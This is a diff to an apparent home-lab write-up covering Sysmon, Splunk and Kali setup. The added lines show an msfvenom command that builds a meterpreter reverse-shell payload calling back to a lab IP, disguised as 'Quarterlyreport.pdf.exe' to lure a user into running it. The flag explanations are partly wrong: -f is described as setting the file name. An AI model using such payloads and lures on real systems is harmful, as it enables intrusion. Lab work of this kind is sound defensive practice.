@@ -34,9 +34,16 @@ Installing Sysmon will enhance our ability to capture system events (Since I don
 
 SPLUNK SETUP
 
+Quarterlyreport.pdf.exe
 
 KALI SETUP
 
-Created Malware payload msfvenmo -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe quarterlyreport.pdf.exe
+Created Malware payload msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
+-p chooses the payload we want to use provided by the Metasploit tool 
+lhost determines where this reverse shell will remote back to, we chose the IP of the red team box
+-f will decide the file name, we will name it Quarterlyreport.pdf.exe to entice the "end user" to click on it.
+
+![Screenshot 2025-03-12 072905](https://github.com/user-attachments/assets/17e8deb8-90ab-4509-b982-a718275314f4)
+
 
 ran multi/handler on msf exploit 
